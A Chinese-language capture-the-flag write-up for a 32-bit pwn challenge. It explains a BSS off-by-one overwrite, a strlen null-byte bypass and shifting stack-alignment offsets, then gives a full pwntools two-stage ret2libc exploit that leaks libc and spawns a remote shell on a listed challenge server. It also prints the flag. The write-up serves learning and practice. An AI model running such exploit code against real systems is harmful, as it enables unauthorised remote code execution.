# CTF 深度解析：冷岸及央麥恩群島 - Or best offer (PWN)

| 屬性 | 規格 |
| :--- | :--- |
| **難度分級** | 80 Pts (Medium-Hard) |
| **核心漏洞** | Off-by-one 覆蓋 (BSS段)、動態堆疊對齊 (Dynamic Stack Alignment)、Ret2libc |
| **防禦機制** | i386 (32-bit), NX Enabled, No Canary, No PIE |
| **關鍵技巧** | Null Byte (`\x00`) 繞過長度檢查、兩階段 ROP (2-Stage ROP) |
| **關鍵工具** | `objdump`, `pwntools`, `nc`, `python3` |

---

## 1. 靜態分析：尋找破口

這題提供了 `libc.so.6`，強烈暗示我們必須使用 **Return-to-libc (ret2libc)** 攻擊。然而，程式的輸入機制設下了重重障礙。

### A. 假象的安全：BSS 段輸入
程式第一次要求輸入 `name` 時，是將資料寫入全域變數區（BSS 段的 `0x804a048`），而不是堆疊（Stack）。這代表我們無法直接在這裡發動 Buffer Overflow 去蓋掉 Return Address。

### B. 嚴格的長度檢查
輸入完畢後，程式會呼叫 `strlen` 檢查輸入長度是否 $\le 20$：
```nasm
call   8048430 <strlen@plt>
cmp    eax, 0x14
jbe    8048646 <main+0xbe>  ; 小於等於 20 才放行
```

---

## 2. 漏洞剖析：連環計的誕生

雖然看似防護嚴密，但這題藏了兩個極度隱蔽的漏洞，讓我們能完美串起攻擊鏈。

### 漏洞一：BSS 段的 Off-by-one (差一錯誤)
控制第三次 `read` 讀取長度的全域變數位在 `0x804a05c`，而我們輸入 `name` 的起始位址是 `0x804a048`。
這兩者的距離剛好是：`0x804a05c - 0x804a048 = 0x14 (20 bytes)`。

程式的第一次 `read` 允許我們寫入 **21 bytes**！這代表我們只要填滿 20 bytes 的垃圾資料，第 21 個 byte 就能**精準覆蓋掉長度變數的最低位元組**，將原本的限制 `0x15` (21) 放大成 `0xff` (255)！

### 漏洞二：`strlen` 的弱點繞過
因為我們要塞滿 21 bytes，原本會被 `strlen` 擋下。但 `strlen` 只要遇到 `\x00` (Null Byte) 就會停止計算。
因此，我們將 Payload 設計為：`b'\x00' * 20 + b'\xff'`。
這樣 `read` 會完整寫入 21 bytes 達成覆蓋，而 `strlen` 會認為長度是 `0`，完美放行！

---

## 3. 致命陷阱：動態堆疊對齊 (Dynamic Stack Alignment)

當我們成功放大長度限制，終於可以在堆疊上發動 Buffer Overflow 時，我們遭遇了本題最大的魔王：**偏移量 (Offset) 居然會變！**

在 `main` 函式的開頭：
```nasm
push   ebp
mov    ebp, esp
and    esp, 0xfffffff0  ; 將堆疊強制對齊到 16 bytes 邊界
sub    esp, 0x30
```

* **Stage 1 (第一次執行 `main`)：**
    作業系統正常呼叫 `main`，堆疊未對齊。`and esp` 指令將 `esp` 向下推了 **8 bytes**。
    計算 Padding：`29 (緩衝區) + 8 (對齊) + 4 (Saved EBP) = 41 bytes`。

* **Stage 2 (ROP 跳回 `main` 後第二次執行)：**
    因為我們是透過 ROP 執行完 `puts(puts_got)` 後跳回 `main`，堆疊上殘留了傳給 `puts` 的參數 (`puts_got`)，導致堆疊的基準點發生了 4 bytes 的位移。
    這使得這一次執行到 `and esp` 時，堆疊**剛好已經是對齊的狀態**，`esp` 向下推了 **0 bytes**！
    計算 Padding：`29 (緩衝區) + 0 (對齊) + 4 (Saved EBP) = 33 bytes`。

**結論：** 我們必須在第一階段塞 `41 bytes`，而在第二階段塞 `33 bytes`，才能精準命中 EIP！

---

## 4. Exploit 實作 (pwntools)

這是結合了所有技巧的最終 2-Stage 攻擊腳本：

```python
from pwn import *

context.arch = 'i386'

elf = ELF('./lovec_5dcef7a3b2521a5d420e2dd2fb1a0b18')
libc = ELF('./libc_e333ccb7d61848c07b4e655c743f0d70.so.6')
r = remote('140.117.80.61', 4441)

# ==========================================
# Stage 1: Leak libc base address
# ==========================================
# 1. 觸發 Off-by-one 覆蓋長度限制，並用 \x00 繞過 strlen
payload_name = b'\x00' * 20 + b'\xff'
r.sendafter(b'name:\n', payload_name)
r.sendlineafter(b'10. C\n', b'1')

# 2. Stage 1 ROP: puts(puts_got) -> main (Padding: 41 bytes)
padding_stage1 = b'A' * 41
rop_leak = flat([
    elf.plt['puts'],      
    elf.sym['main'],      
    elf.got['puts']       
])
r.sendafter(b'like it?\n', padding_stage1 + rop_leak)

# 3. 解析位址
r.recvuntil(b'Have a nice day!\n')
leaked_puts = u32(r.recv(4).ljust(4, b'\x00'))
libc.address = leaked_puts - libc.sym['puts']
system_addr = libc.sym['system']
binsh_addr = next(libc.search(b'/bin/sh\x00'))

# ==========================================
# Stage 2: Get Shell
# ==========================================
# 4. 再次觸發 Off-by-one 覆蓋長度限制
r.sendafter(b'name:\n', payload_name)
r.sendlineafter(b'10. C\n', b'1')

# 5. Stage 2 ROP: system("/bin/sh") (Padding: 33 bytes)
padding_stage2 = b'A' * 33
rop_shell = flat([
    system_addr,          
    0xdeadbeef,           
    binsh_addr            
])
r.sendafter(b'like it?\n', padding_stage2 + rop_shell)

# 6. 拿下 Shell
r.interactive()
```

---

## 5. 反思與總結

這題「冷岸及央麥恩群島」是一堂極佳的 PWN 進階課。
1. **永遠不要忽視全域變數的相對位置**：當輸入不在 Stack 上時，尋找 BSS 段上的越界寫入（OOB Write / Off-by-one）往往是破局的關鍵。
2. **動態對齊是 x86 的隱形殺手**：如果 ROP Chain 總是會引發詭異的 `Segmentation Fault` 或 `EOF`，不要懷疑自己算錯數學，請回去看 `main` 函式開頭是否有 `and esp, ...` 在搞鬼。分段除錯、動態檢查堆疊狀態才是王道！

**🚩 FLAG: `FLAG{00ps_0ff_by_0n3_}`**